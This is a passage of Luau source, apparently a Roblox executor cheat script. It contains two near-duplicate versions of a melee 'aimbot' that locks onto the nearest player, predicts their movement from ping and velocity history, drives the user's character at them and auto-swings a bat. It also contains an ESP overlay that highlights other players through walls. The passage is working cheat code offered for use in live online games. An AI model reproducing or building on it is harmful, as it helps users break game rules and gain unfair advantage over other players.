	Z.targetVelocity = Vector3.zero
	Z.smoothedVelocity = Vector3.zero
	Z.velocityHistory = {}
	Z.accelerationHistory = {}
	Z.aerialVelocityHistory = {}
	Z.verticalVelocityHistory = {}
	Z.previousDirection = nil
	Z.airborneTime = 0
	Z.lastYVelocity = 0
	end
	local function nearestZurichTarget(root)
	local nearest, nearestDistance = nil, math.huge
	for _, candidate in ipairs(Players:GetPlayers()) do
	if candidate ~= Player and candidate.Character then
	local targetRoot = candidate.Character:FindFirstChild("HumanoidRootPart")
	local targetHumanoid = candidate.Character:FindFirstChildOfClass("Humanoid")
	if targetRoot and targetHumanoid and targetHumanoid.Health > 0 then
	local distance = (root.Position - targetRoot.Position).Magnitude
	if distance < nearestDistance then nearest, nearestDistance = candidate, distance end
	end
	end
	end
	return nearest
	end
	local function rotateZurichRoot(root, direction)
	if direction.Magnitude < 0.01 then return end
	local axis = root.CFrame.LookVector:Cross(direction.Unit)
	local angle = math.asin(math.clamp(axis.Magnitude, -1, 1))
	root.AssemblyAngularVelocity = axis.Magnitude > 0.01 and axis.Unit * angle * 80 or Vector3.zero
	end
	-- Imported Akatsuki marker bridge.  The TP Bat marker is optional; when it
	-- does not exist, the original Akatsuki nearest-player aimbot path runs.
	local function getImportedBatAimbotMarker()
		local markerGetter = _G.__AkatsukiTPBatGetMarkerCFrame or _G.__UnoTPBatGetMarkerCFrame
		if type(markerGetter) ~= "function" then return nil end
		local ok, markerCFrame = pcall(markerGetter)
		return ok and markerCFrame or nil
	end
	local function sampleZurichPing()
	local ok, value = pcall(function()
	return game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValue()
	end)
	if ok and type(value) == "number" then Z.realPingMs = math.floor(value) end
	Z.currentPing = math.clamp(Z.realPingMs / 1000, ZCFG.MIN_PING_COMPENSATION, ZCFG.MAX_PING_COMPENSATION)
	end
	task.spawn(function()
	while _G.__UNO_STATE == crystalRuntimeState do
	pcall(sampleZurichPing)
	task.wait(0.5)
	end
	end)

	local function stopZurichAimbot()
	if zurichConn then zurichConn:Disconnect(); zurichConn = nil end
	local char = Player.Character
	local humanoid = char and char:FindFirstChildOfClass("Humanoid")
	local root = char and char:FindFirstChild("HumanoidRootPart")
	if humanoid then humanoid.AutoRotate = true end
	if root then root.AssemblyAngularVelocity = Vector3.zero end
	resetZurichTarget()
	Z.lastActivationTime = 0
	end

	local function startZurichAimbot(char)
	char = char or Player.Character
	local humanoid = char and char:FindFirstChildOfClass("Humanoid")
	local root = char and char:FindFirstChild("HumanoidRootPart")
	if not humanoid or not root then return end
	stopZurichAimbot()
	humanoid.AutoRotate = false
	local bat = getBat()
	if bat and bat.Parent ~= char then pcall(humanoid.EquipTool, humanoid, bat) end
	zurichConn = RunService.RenderStepped:Connect(function(dt)
	if not toggleStates["Aimbot"] then stopZurichAimbot(); return end
	local currentChar = Player.Character
	local currentRoot = currentChar and currentChar:FindFirstChild("HumanoidRootPart")
	local currentHumanoid = currentChar and currentChar:FindFirstChildOfClass("Humanoid")
	if not currentRoot or not currentHumanoid or currentHumanoid.Health <= 0 then return end
	currentHumanoid.AutoRotate = false
	root, humanoid = currentRoot, currentHumanoid
	bat = currentChar:FindFirstChildOfClass("Tool") or getBat()
	if bat and bat.Parent ~= currentChar then pcall(currentHumanoid.EquipTool, currentHumanoid, bat) end

	local markerCFrame = getImportedBatAimbotMarker()
	if markerCFrame then
	local markedDirection = markerCFrame.Position - root.Position
	if markedDirection.Magnitude > 0.1 then rotateZurichRoot(root, markedDirection) end
	if markedDirection.Magnitude > ZCFG.MIN_FOLLOW_DISTANCE then
	local markedSpeed = tonumber(speedValues.CypherAimbotApproachSpeed) or ZCFG.FOLLOW_SPEED
	root.AssemblyLinearVelocity = markedDirection.Unit * math.clamp(markedSpeed, 1, 120)
	else
	root.AssemblyLinearVelocity = Vector3.zero
	end
	return
	end

	Z.targetPlayer = nearestZurichTarget(root)
	local targetChar = Z.targetPlayer and Z.targetPlayer.Character
	local targetRoot = targetChar and targetChar:FindFirstChild("HumanoidRootPart")
	local targetHumanoid = targetChar and targetChar:FindFirstChildOfClass("Humanoid")
	if not targetRoot or not targetHumanoid or targetHumanoid.Health <= 0 then resetZurichTarget(); return end
	local targetPos = targetRoot.Position
	local safeDt = math.max(dt, 1 / 240)
	if Z.lastTargetPos then
	local rawVelocity = (targetPos - Z.lastTargetPos) / safeDt
	local velocityDelta = rawVelocity - Z.targetVelocity
	if velocityDelta.Magnitude > ZCFG.MAX_VELOCITY_CHANGE then
	rawVelocity = Z.targetVelocity + velocityDelta.Unit * ZCFG.MAX_VELOCITY_CHANGE
	end
	local horizontal = Vector3.new(rawVelocity.X, 0, rawVelocity.Z)
	if horizontal.Magnitude > ZCFG.MAX_HORIZONTAL_VELOCITY then
	horizontal = horizontal.Unit * ZCFG.MAX_HORIZONTAL_VELOCITY
	rawVelocity = Vector3.new(horizontal.X, rawVelocity.Y, horizontal.Z)
	end
	pushHistory(Z.accelerationHistory, (rawVelocity - Z.targetVelocity) / safeDt, 4)
	pushHistory(Z.velocityHistory, rawVelocity, 8)
	pushHistory(Z.verticalVelocityHistory, rawVelocity.Y, 5)
	Z.targetVelocity = rawVelocity
	Z.smoothedVelocity = Z.smoothedVelocity:Lerp(rawVelocity, ZCFG.VELOCITY_SMOOTHING)
	end
	Z.lastTargetPos = targetPos

	local airborne = targetHumanoid.FloorMaterial == Enum.Material.Air
	Z.airborneTime = airborne and (Z.airborneTime + safeDt) or 0
	if airborne and Z.airborneTime >= ZCFG.MIN_AIRBORNE_TIME then
	pushHistory(Z.aerialVelocityHistory, Z.targetVelocity, 6)
	elseif not airborne then
	Z.aerialVelocityHistory = {}
	end
	local predictionVelocity = Z.smoothedVelocity
	if airborne and #Z.aerialVelocityHistory > 0 then
	local aerial = averageVector(Z.aerialVelocityHistory)
	predictionVelocity = Vector3.new(aerial.X, Z.targetVelocity.Y, aerial.Z) * ZCFG.AIR_CONTROL_FACTOR
	end
	local quickTurn = false
	local horizontalVelocity = Vector3.new(Z.targetVelocity.X, 0, Z.targetVelocity.Z)
	if horizontalVelocity.Magnitude > 5 then
	local direction = horizontalVelocity.Unit
	if Z.previousDirection and Z.previousDirection:Dot(direction) < 0.5 then
	quickTurn = tick() - Z.lastDirectionChangeTime < ZCFG.DIRECTION_CHANGE_DETECTION_TIME
	Z.lastDirectionChangeTime = tick()
	end
	Z.previousDirection = direction
	end
	local serverDelay = Z.currentPing + ZCFG.SERVER_TICKRATE
	if quickTurn then serverDelay *= ZCFG.QUICK_DIRECTION_CHANGE_MULTIPLIER end
	local predicted = targetPos + predictionVelocity * serverDelay
	local acceleration = averageVector(Z.accelerationHistory)
	predicted += acceleration * ZCFG.ACCELERATION_PREDICTION_WEIGHT * (serverDelay * serverDelay * 0.5)
	local predictionTime = ZCFG.PREDICTION_TIME * 1.1
	if airborne then
	predicted += predictionVelocity * predictionTime
	predicted += Vector3.new(0, -0.5 * ZCFG.GRAVITY * predictionTime * predictionTime, 0)
	else
	predicted += predictionVelocity * predictionTime
	end
	local flatPrediction = Vector3.new(predictionVelocity.X, 0, predictionVelocity.Z)
	if flatPrediction.Magnitude > 1 then predicted += flatPrediction.Unit * ZCFG.PREDICT_AHEAD end
	local toTarget = predicted - root.Position
	rotateZurichRoot(root, toTarget)
	if (targetPos - root.Position).Magnitude <= ZCFG.ACTIVATE_DISTANCE and tick() - Z.lastActivationTime >= 0.3 then
	if bat then pcall(bat.Activate, bat) end
	Z.lastActivationTime = tick()
	end
	if toTarget.Magnitude > ZCFG.MIN_FOLLOW_DISTANCE then
	local speed = math.clamp(tonumber(speedValues.CypherAimbotApproachSpeed) or ZCFG.FOLLOW_SPEED or 55, 1, 120)
	root.AssemblyLinearVelocity = toTarget.Unit * speed
	else
	root.AssemblyLinearVelocity = Vector3.new(0, root.AssemblyLinearVelocity.Y * 0.5, 0)
	end
	end)
	end

	_cypherStartFollowing = startZurichAimbot
	_cypherStop = stopZurichAimbot
	FeaturePostToggle["Aimbot"] = function(active)
	if active then
	if _G.__stopSpeedBoost then _G.__stopSpeedBoost() end
	if autoplayActive or toggleStates["Autoplay"] then _G.__stopAutoplay() end
	deactivateOtherAimbots("Aimbot")
	if _G.__deactivateBatExclusive then _G.__deactivateBatExclusive("Aimbot") end
	_G.__checkAndAutoDrop(function() startZurichAimbot(Player.Character) end)
	else
	stopZurichAimbot()
	if _G.__refreshSpeedBoost then _G.__refreshSpeedBoost() end
	end
	end
	_G.__UnoTrackStopper(stopZurichAimbot)
	end

	if toggleStates["Aimbot"] then
	task.defer(function()
	if toggleStates["Aimbot"] and FeaturePostToggle["Aimbot"] then
	FeaturePostToggle["Aimbot"](true)
	end
	end)
	end
	end

	-- Akatsuki Bat Aimbot controller.  This is the donor's live controller
	-- adapted to Cursed's state, UI toggle, cleanup, and TP-Bat marker API.
	do
		local aimbotState = {
			targetPlayer = nil,
			lastTargetPos = nil,
			targetVelocity = Vector3.zero,
			smoothedVelocity = Vector3.zero,
			velocityHistory = {},
			accelerationHistory = {},
			aerialVelocityHistory = {},
			verticalVelocityHistory = {},
			previousDirection = nil,
			lastDirectionChangeTime = 0,
			airborneTime = 0,
			lastYVelocity = 0,
			lastActivationTime = 0,
			currentPing = 0.1,
			realPingMs = 0,
		}
		local aimbotConfig = {
			FOLLOW_SPEED = 55,
			ACTIVATE_DISTANCE = 13,
			MIN_FOLLOW_DISTANCE = 1,
			PREDICTION_TIME = 0.22,
			PREDICT_AHEAD = 3,
			MAX_VELOCITY_CHANGE = 150,
			VELOCITY_SMOOTHING = 0.2,
			MAX_HORIZONTAL_VELOCITY = 80,
			SERVER_TICKRATE = 1 / 60,
			MIN_PING_COMPENSATION = 0.03,
			MAX_PING_COMPENSATION = 0.25,
			ACCELERATION_PREDICTION_WEIGHT = 0.3,
			DIRECTION_CHANGE_DETECTION_TIME = 0.12,
			QUICK_DIRECTION_CHANGE_MULTIPLIER = 1.5,
			GRAVITY = 196.2,
			AIR_CONTROL_FACTOR = 0.8,
			MIN_AIRBORNE_TIME = 0.08,
		}
		local aimbotConnection = nil

		local function getBatTool()
			local character = Player.Character
			if not character then return nil end
			local equipped = character:FindFirstChildOfClass("Tool")
			if equipped then
				local name = equipped.Name:lower()
				if name:find("bat", 1, true) or name:find("slap", 1, true) then return equipped end
			end
			local backpack = Player:FindFirstChildOfClass("Backpack")
			if backpack then
				for _, tool in ipairs(backpack:GetChildren()) do
					if tool:IsA("Tool") then
						local name = tool.Name:lower()
						if name:find("bat", 1, true) or name:find("slap", 1, true) then return tool end
					end
				end
			end
			return nil
		end

		local function averageVector(history)
			if #history == 0 then return Vector3.zero end
			local total = Vector3.zero
			for _, value in ipairs(history) do total += value end
			return total / #history
		end
		local function pushHistory(history, value, maximum)
			table.insert(history, value)
			if #history > maximum then table.remove(history, 1) end
		end
		local function resetTarget()
			aimbotState.targetPlayer = nil
			aimbotState.lastTargetPos = nil
			aimbotState.targetVelocity = Vector3.zero
			aimbotState.smoothedVelocity = Vector3.zero
			aimbotState.velocityHistory = {}
			aimbotState.accelerationHistory = {}
			aimbotState.aerialVelocityHistory = {}
			aimbotState.verticalVelocityHistory = {}
			aimbotState.previousDirection = nil
			aimbotState.airborneTime = 0
			aimbotState.lastYVelocity = 0
		end
		local function nearestTarget(root)
			local nearest, nearestDistance = nil, math.huge
			for _, candidate in ipairs(Players:GetPlayers()) do
				if candidate ~= Player and candidate.Character then
					local targetRoot = candidate.Character:FindFirstChild("HumanoidRootPart")
					local targetHumanoid = candidate.Character:FindFirstChildOfClass("Humanoid")
					if targetRoot and targetHumanoid and targetHumanoid.Health > 0 then
						local distance = (root.Position - targetRoot.Position).Magnitude
						if distance < nearestDistance then nearest, nearestDistance = candidate, distance end
					end
				end
			end
			return nearest
		end
		local function rotateRoot(root, direction)
			if direction.Magnitude < 0.01 then return end
			local axis = root.CFrame.LookVector:Cross(direction.Unit)
			local angle = math.asin(math.clamp(axis.Magnitude, -1, 1))
			root.AssemblyAngularVelocity = axis.Magnitude > 0.01 and axis.Unit * angle * 80 or Vector3.zero
		end
		local function getDonorMarkerCFrame()
			local getter = _G.__AkatsukiTPBatGetMarkerCFrame or _G.__UnoTPBatGetMarkerCFrame
			if type(getter) ~= "function" then return nil end
			local ok, result = pcall(getter)
			return ok and result or nil
		end
		local function refreshPing()
			local ok, value = pcall(function()
				return game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValue()
			end)
			if ok and type(value) == "number" then aimbotState.realPingMs = math.floor(value) end
			aimbotState.currentPing = math.clamp(
				aimbotState.realPingMs / 1000,
				aimbotConfig.MIN_PING_COMPENSATION,
				aimbotConfig.MAX_PING_COMPENSATION
			)
		end
		task.spawn(function()
			while _G.__UNO_STATE == crystalRuntimeState do
				pcall(refreshPing)
				task.wait(0.5)
			end
		end)

		local function stopAkatsukiBatAimbot()
			if aimbotConnection then aimbotConnection:Disconnect(); aimbotConnection = nil end
			local character = Player.Character
			local humanoid = character and character:FindFirstChildOfClass("Humanoid")
			local root = character and character:FindFirstChild("HumanoidRootPart")
			if humanoid then humanoid.AutoRotate = true end
			if root then root.AssemblyAngularVelocity = Vector3.zero end
			resetTarget()
			aimbotState.lastActivationTime = 0
		end

		local function startAkatsukiBatAimbot(character)
			character = character or Player.Character
			local humanoid = character and character:FindFirstChildOfClass("Humanoid")
			local root = character and character:FindFirstChild("HumanoidRootPart")
			if not humanoid or not root then return end
			stopAkatsukiBatAimbot()
			humanoid.AutoRotate = false
			local bat = getBatTool()
			if bat and bat.Parent ~= character then pcall(humanoid.EquipTool, humanoid, bat) end
			aimbotConnection = RunService.RenderStepped:Connect(function(deltaTime)
				if not toggleStates["Aimbot"] then stopAkatsukiBatAimbot(); return end
				local currentCharacter = Player.Character
				local currentRoot = currentCharacter and currentCharacter:FindFirstChild("HumanoidRootPart")
				local currentHumanoid = currentCharacter and currentCharacter:FindFirstChildOfClass("Humanoid")
				if not currentRoot or not currentHumanoid or currentHumanoid.Health <= 0 then return end
				currentHumanoid.AutoRotate = false
				bat = currentCharacter:FindFirstChildOfClass("Tool") or getBatTool()
				if bat and bat.Parent ~= currentCharacter then pcall(currentHumanoid.EquipTool, currentHumanoid, bat) end

				local markerCFrame = getDonorMarkerCFrame()
				if markerCFrame then
					local markerDirection = markerCFrame.Position - currentRoot.Position
					rotateRoot(currentRoot, markerDirection)
					if markerDirection.Magnitude > aimbotConfig.MIN_FOLLOW_DISTANCE then
						local speed = math.clamp(tonumber(speedValues.CypherAimbotApproachSpeed) or aimbotConfig.FOLLOW_SPEED, 1, 120)
						currentRoot.AssemblyLinearVelocity = markerDirection.Unit * speed
					else
						currentRoot.AssemblyLinearVelocity = Vector3.zero
					end
					return
				end

				aimbotState.targetPlayer = nearestTarget(currentRoot)
				local targetCharacter = aimbotState.targetPlayer and aimbotState.targetPlayer.Character
				local targetRoot = targetCharacter and targetCharacter:FindFirstChild("HumanoidRootPart")
				local targetHumanoid = targetCharacter and targetCharacter:FindFirstChildOfClass("Humanoid")
				if not targetRoot or not targetHumanoid or targetHumanoid.Health <= 0 then resetTarget(); return end
				local targetPosition = targetRoot.Position
				local safeDelta = math.max(deltaTime or 0, 1 / 240)
				if aimbotState.lastTargetPos then
					local rawVelocity = (targetPosition - aimbotState.lastTargetPos) / safeDelta
					local velocityChange = rawVelocity - aimbotState.targetVelocity
					if velocityChange.Magnitude > aimbotConfig.MAX_VELOCITY_CHANGE then
						rawVelocity = aimbotState.targetVelocity + velocityChange.Unit * aimbotConfig.MAX_VELOCITY_CHANGE
					end
					local horizontalVelocity = Vector3.new(rawVelocity.X, 0, rawVelocity.Z)
					if horizontalVelocity.Magnitude > aimbotConfig.MAX_HORIZONTAL_VELOCITY then
						horizontalVelocity = horizontalVelocity.Unit * aimbotConfig.MAX_HORIZONTAL_VELOCITY
						rawVelocity = Vector3.new(horizontalVelocity.X, rawVelocity.Y, horizontalVelocity.Z)
					end
					pushHistory(aimbotState.accelerationHistory, (rawVelocity - aimbotState.targetVelocity) / safeDelta, 4)
					pushHistory(aimbotState.velocityHistory, rawVelocity, 8)
					pushHistory(aimbotState.verticalVelocityHistory, rawVelocity.Y, 5)
					aimbotState.targetVelocity = rawVelocity
					aimbotState.smoothedVelocity = aimbotState.smoothedVelocity:Lerp(rawVelocity, aimbotConfig.VELOCITY_SMOOTHING)
				end
				aimbotState.lastTargetPos = targetPosition
				local airborne = targetHumanoid.FloorMaterial == Enum.Material.Air
				aimbotState.airborneTime = airborne and (aimbotState.airborneTime + safeDelta) or 0
				if airborne and aimbotState.airborneTime >= aimbotConfig.MIN_AIRBORNE_TIME then
					pushHistory(aimbotState.aerialVelocityHistory, aimbotState.targetVelocity, 6)
				elseif not airborne then
					aimbotState.aerialVelocityHistory = {}
				end
				local predictionVelocity = aimbotState.smoothedVelocity
				if airborne and #aimbotState.aerialVelocityHistory > 0 then
					local aerialVelocity = averageVector(aimbotState.aerialVelocityHistory)
					predictionVelocity = Vector3.new(aerialVelocity.X, aimbotState.targetVelocity.Y, aerialVelocity.Z) * aimbotConfig.AIR_CONTROL_FACTOR
				end
				local quickTurn = false
				local horizontalVelocity = Vector3.new(aimbotState.targetVelocity.X, 0, aimbotState.targetVelocity.Z)
				if horizontalVelocity.Magnitude > 5 then
					local direction = horizontalVelocity.Unit
					if aimbotState.previousDirection and aimbotState.previousDirection:Dot(direction) < 0.5 then
						quickTurn = tick() - aimbotState.lastDirectionChangeTime < aimbotConfig.DIRECTION_CHANGE_DETECTION_TIME
						aimbotState.lastDirectionChangeTime = tick()
					end
					aimbotState.previousDirection = direction
				end
				local serverDelay = aimbotState.currentPing + aimbotConfig.SERVER_TICKRATE
				if quickTurn then serverDelay *= aimbotConfig.QUICK_DIRECTION_CHANGE_MULTIPLIER end
				local predicted = targetPosition + predictionVelocity * serverDelay
				local acceleration = averageVector(aimbotState.accelerationHistory)
				predicted += acceleration * aimbotConfig.ACCELERATION_PREDICTION_WEIGHT * (serverDelay * serverDelay * 0.5)
				local predictionTime = aimbotConfig.PREDICTION_TIME * 1.1
				predicted += predictionVelocity * predictionTime
				if airborne then
					predicted += Vector3.new(0, -0.5 * aimbotConfig.GRAVITY * predictionTime * predictionTime, 0)
				end
				local flatPredictionVelocity = Vector3.new(predictionVelocity.X, 0, predictionVelocity.Z)
				if flatPredictionVelocity.Magnitude > 1 then predicted += flatPredictionVelocity.Unit * aimbotConfig.PREDICT_AHEAD end
				local toTarget = predicted - currentRoot.Position
				rotateRoot(currentRoot, toTarget)
				if (targetPosition - currentRoot.Position).Magnitude <= aimbotConfig.ACTIVATE_DISTANCE
					and tick() - aimbotState.lastActivationTime >= 0.3 then
					if bat then pcall(bat.Activate, bat) end
					aimbotState.lastActivationTime = tick()
				end
				if toTarget.Magnitude > aimbotConfig.MIN_FOLLOW_DISTANCE then
					local speed = math.clamp(tonumber(speedValues.CypherAimbotApproachSpeed) or aimbotConfig.FOLLOW_SPEED, 1, 120)
					currentRoot.AssemblyLinearVelocity = toTarget.Unit * speed
				else
					currentRoot.AssemblyLinearVelocity = Vector3.new(0, currentRoot.AssemblyLinearVelocity.Y * 0.5, 0)
				end
			end)
		end

		_cypherStartFollowing = startAkatsukiBatAimbot
		_cypherStop = stopAkatsukiBatAimbot
		FeaturePostToggle["Aimbot"] = function(active)
			if active then
				if _G.__stopSpeedBoost then _G.__stopSpeedBoost() end
				if autoplayActive or toggleStates["Autoplay"] then _G.__stopAutoplay() end
				deactivateOtherAimbots("Aimbot")
				if _G.__deactivateBatExclusive then _G.__deactivateBatExclusive("Aimbot") end
				_G.__checkAndAutoDrop(function() startAkatsukiBatAimbot(Player.Character) end)
			else
				stopAkatsukiBatAimbot()
				if _G.__refreshSpeedBoost then _G.__refreshSpeedBoost() end
			end
		end
		_G.__UnoTrackStopper(stopAkatsukiBatAimbot)
		_G.__UnoTrackConn(Player.CharacterAdded:Connect(function(character)
			task.wait(0.5)
			if toggleStates["Aimbot"] then startAkatsukiBatAimbot(character) end
		end))
	end

	do
	local espEnabled = false
	local espActivePlayers = {}
	local espLoopConn = nil
	local Camera = workspace.CurrentCamera
	local GUI2_ESP_COLOR = Color3.fromRGB(139, 72, 246)
	local GUI2_ESP_TEXT_STROKE = Color3.fromRGB(48, 16, 92)
	local function getESPThemeColors(accent)
	if _G.__UnoGuiTheme == "GUI 3" then
	return Color3.fromRGB(255, 45, 45), Color3.fromRGB(255, 45, 45)
	end
	if _G.__UnoGuiTheme == "GUI 2" then
	return GUI2_ESP_COLOR, GUI2_ESP_COLOR
	end
	return accent or _G.__UnoThemeAccent or Color3.fromRGB(245, 245, 250), Color3.fromRGB(0, 0, 0)
	end

	local function createESP()
	local currentFill, currentLine = getESPThemeColors()
	local esp = {
	Tracer = Drawing.new("Line"),
	Highlight = Instance.new("Highlight"),
	Lines = {}
	}

	esp.Tracer.Color = currentLine
	esp.Tracer.Thickness = 3
	esp.Tracer.Transparency = 1
	esp.Tracer.ZIndex = 2

	esp.Highlight.Name = "ESP_Highlight"
	esp.Highlight.FillColor = currentFill
	esp.Highlight.OutlineColor = Color3.fromRGB(0, 0, 0)
	esp.Highlight.FillTransparency = 0.12
	esp.Highlight.OutlineTransparency = 0.18
	esp.Highlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop

	local parentGui
	local ok, robGui = pcall(function() return game:GetService("CoreGui"):FindFirstChild("RobloxGui") end)
	if ok and robGui then
	parentGui = robGui
	else
	parentGui = Player:FindFirstChildOfClass("PlayerGui")
	end
	if not parentGui then
	parentGui = game:GetService("CoreGui")
	end

	pcall(function() esp.Highlight.Parent = parentGui end)

	local nameBillboard = Instance.new("BillboardGui")
	nameBillboard.Name = "ESP_Name"
	nameBillboard.Size = UDim2.new(0, 170, 0, 28)
	nameBillboard.StudsOffset = Vector3.new(0, 1.3, 0)
	nameBillboard.AlwaysOnTop = true
	nameBillboard.Parent = parentGui

	local nameLabel = Instance.new("TextLabel")
	nameLabel.Size = UDim2.new(0, 170, 0, 28)
	nameLabel.AnchorPoint = Vector2.new(0.5, 0)
	nameLabel.Position = UDim2.new(0.5, 0, 0, 2)
	nameLabel.BackgroundTransparency = 1
	nameLabel.Text = tostring(currentPresetName or "")
	nameLabel.TextColor3 = _G.__UnoGuiTheme == "GUI 3" and Color3.fromRGB(255, 45, 45) or (_G.__UnoGuiTheme == "GUI 2" and GUI2_ESP_COLOR or Color3.fromRGB(245, 245, 255))
	nameLabel.TextSize = 15
	nameLabel.Font = Enum.Font.GothamBold
	nameLabel.TextStrokeColor3 = _G.__UnoGuiTheme == "GUI 2" and GUI2_ESP_TEXT_STROKE or Color3.fromRGB(0, 0, 0)
	nameLabel.TextStrokeTransparency = 0
	nameLabel.TextXAlignment = Enum.TextXAlignment.Center
	nameLabel.TextYAlignment = Enum.TextYAlignment.Center
	nameLabel.ZIndex = 5
	nameLabel.Parent = nameBillboard

	local nameOutline = Instance.new("UIStroke")
	nameOutline.Color = _G.__UnoGuiTheme == "GUI 2" and GUI2_ESP_TEXT_STROKE or Color3.fromRGB(0, 0, 0)
	nameOutline.Thickness = 2.2
	nameOutline.Transparency = 0.12
	nameOutline.Parent = nameLabel
	for i = 1, 14 do
	local line = Drawing.new("Line")
	line.Color = currentLine
	line.Thickness = 2
	line.Transparency = 1
	line.ZIndex = 3
	table.insert(esp.Lines, line)
	end

	esp.NameTag = nameBillboard
	esp.NameLabel = nameLabel
	esp.NameOutline = nameOutline
	return esp
	end

	_G.__UnoRefreshESPTheme = function(accent, outlineColor)
	local fillColor, lineColor = getESPThemeColors(accent)
	for _, data in pairs(espActivePlayers) do
	if type(data) == "table" and data.esp then
	local esp = data.esp
	if esp.Tracer then pcall(function() esp.Tracer.Color = lineColor end) end
	if esp.Highlight then
	esp.Highlight.FillColor = fillColor
	esp.Highlight.OutlineColor = Color3.fromRGB(0, 0, 0)
	end
	if esp.NameLabel then
	esp.NameLabel.TextColor3 = _G.__UnoGuiTheme == "GUI 3" and Color3.fromRGB(255, 45, 45) or (_G.__UnoGuiTheme == "GUI 2" and GUI2_ESP_COLOR or Color3.fromRGB(245, 245, 255))
	esp.NameLabel.TextStrokeColor3 = _G.__UnoGuiTheme == "GUI 2" and GUI2_ESP_TEXT_STROKE or Color3.fromRGB(0, 0, 0)
	end
	if esp.NameOutline then
	esp.NameOutline.Color = _G.__UnoGuiTheme == "GUI 2" and GUI2_ESP_TEXT_STROKE or Color3.fromRGB(0, 0, 0)
	end
	for _, line in ipairs(esp.Lines or {}) do pcall(function() line.Color = lineColor end) end
	end
	end
	end

	local function removeESP(plr)
	local data = espActivePlayers[plr]
	if data then
	if data.esp.Tracer then pcall(function() data.esp.Tracer:Remove() end) end
	if data.esp.Highlight then pcall(function() data.esp.Highlight:Destroy() end) end
	if data.esp.NameTag then pcall(function() data.esp.NameTag:Destroy() end) end
	for _, line in ipairs(data.esp.Lines) do
	pcall(function() line:Remove() end)
	end
	if data.loopConn then pcall(function() data.loopConn:Disconnect() end) end
	espActivePlayers[plr] = nil
	end
	end

	local function updateESP(plr, esp)
	if not espEnabled then
	esp.Tracer.Visible = false
	esp.Highlight.Enabled = false
	for _, line in ipairs(esp.Lines) do line.Visible = false end
	return
	end

	local character = plr.Character
	local hum = character and character:FindFirstChildOfClass("Humanoid")
	local trackPart = character and (
	character:FindFirstChild("HumanoidRootPart")
	or character.PrimaryPart
	or character:FindFirstChild("UpperTorso")
	or character:FindFirstChild("Torso")
	or character:FindFirstChild("Head")
	)

	if character and trackPart and (not hum or hum.Health > 0) then
	esp.Highlight.Adornee = character
	esp.Highlight.Enabled = toggleStates["ESP Players"] or false

	local _, onScreen = Camera:WorldToViewportPoint(trackPart.Position)

	if onScreen then
	esp.Tracer.Visible = false
	else
	for _, line in ipairs(esp.Lines) do line.Visible = false end
	end

	if esp.NameTag and esp.NameLabel then
	pcall(function()
	esp.NameTag.Adornee = trackPart
	esp.NameTag.Enabled = toggleStates["ESP Players"] or false
	esp.NameLabel.Text = plr.Name or plr.DisplayName or ""
	local gui2Active = _G.__UnoGuiTheme == "GUI 2"
	esp.NameLabel.TextColor3 = _G.__UnoGuiTheme == "GUI 3" and Color3.fromRGB(255, 45, 45) or (gui2Active and GUI2_ESP_COLOR or Color3.fromRGB(245, 245, 255))
	esp.NameLabel.TextStrokeColor3 = gui2Active and GUI2_ESP_TEXT_STROKE or Color3.fromRGB(0, 0, 0)
	if esp.NameOutline then
	esp.NameOutline.Color = gui2Active and GUI2_ESP_TEXT_STROKE or Color3.fromRGB(0, 0, 0)
	end
	end)
	end
	else
	esp.Tracer.Visible = false
	esp.Highlight.Enabled = false
	esp.Highlight.Adornee = nil
	for _, line in ipairs(esp.Lines) do line.Visible = false end
	if esp.NameTag and esp.NameLabel then
	pcall(function()
	esp.NameTag.Enabled = false
	end)
	end
	end
	end

	local function createESPForPlayer(plr)
	if plr == Player then return end
	if espActivePlayers[plr] and espActivePlayers[plr].esp then
	if espActivePlayers[plr].esp.NameTag then
	pcall(function() espActivePlayers[plr].esp.NameTag.Enabled = toggleStates["ESP Players"] or false end)
	end
	return
	end
	removeESP(plr)
	local esp = createESP()
	espActivePlayers[plr] = {esp = esp}
	end

	local function enableESP()
	if espEnabled then return end; espEnabled = true
	for _, plr in pairs(Players:GetPlayers()) do
	if plr ~= Player then task.spawn(function() createESPForPlayer(plr) end) end
	end
	local espAccumulator = 0
	if espLoopConn then espLoopConn:Disconnect() end
	espLoopConn = RunService.Heartbeat:Connect((function(dt)
	espAccumulator = espAccumulator + (dt or 0)
	if espAccumulator < 0.50 then return end
	espAccumulator = 0
	for plr, data in pairs(espActivePlayers) do
	if typeof(plr) == "Instance" and plr:IsA("Player") and data and data.esp then
	pcall(function() updateESP(plr, data.esp) end)
	end
	end
	end))
	local joinConn = Players.PlayerAdded:Connect(function(plr)
	if not espEnabled or plr == Player then return end
	task.wait(0.3)
	createESPForPlayer(plr)
	end)
	local leaveConn = Players.PlayerRemoving:Connect(function(plr) removeESP(plr) end)
	espActivePlayers._joinConn = joinConn
	espActivePlayers._leaveConn = leaveConn
	end

local function disableESP()
	espEnabled = false
	if espLoopConn then espLoopConn:Disconnect(); espLoopConn = nil end
	if espActivePlayers._joinConn then pcall(function() espActivePlayers._joinConn:Disconnect() end); espActivePlayers._joinConn = nil end
	if espActivePlayers._leaveConn then pcall(function() espActivePlayers._leaveConn:Disconnect() end); espActivePlayers._leaveConn = nil end
	for plr in pairs(espActivePlayers) do
	if typeof(plr) == "Instance" and plr:IsA("Player") and plr ~= Player then removeESP(plr) end
end
end
_G.__UnoTrackStopper(disableESP)
FeaturePostToggle["ESP Players"] = function(active)
if active then enableESP() else disableESP() end
end

if toggleStates["ESP Players"] then enableESP() end

	local oldTracer = _G.__UnoPlayerTracerLine
	if oldTracer then pcall(function() oldTracer:Remove() end) end
	local tracerGui = Instance.new("ScreenGui")
	tracerGui.Name = "UnoPlayerTracerOverlay"
	tracerGui.IgnoreGuiInset = true
	tracerGui.ResetOnSpawn = false
	tracerGui.DisplayOrder = 1000
	tracerGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
	tracerGui.Parent = Player:WaitForChild("PlayerGui")
	local playerTracer = Instance.new("Frame")
	playerTracer.Name = "ESPLine"
	playerTracer.AnchorPoint = Vector2.new(0.5, 0.5)
	playerTracer.BorderSizePixel = 0
	playerTracer.Active = false
	playerTracer.Visible = false
	playerTracer.ZIndex = 1
	playerTracer.Parent = tracerGui
	local tracerOutline = Instance.new("UIStroke", playerTracer)
	tracerOutline.Color = Color3.fromRGB(255, 255, 255)
	tracerOutline.Thickness = 0.7
	tracerOutline.Transparency = 0.45
	_G.__UnoPlayerTracerLine = {Remove = function() tracerGui:Destroy() end}
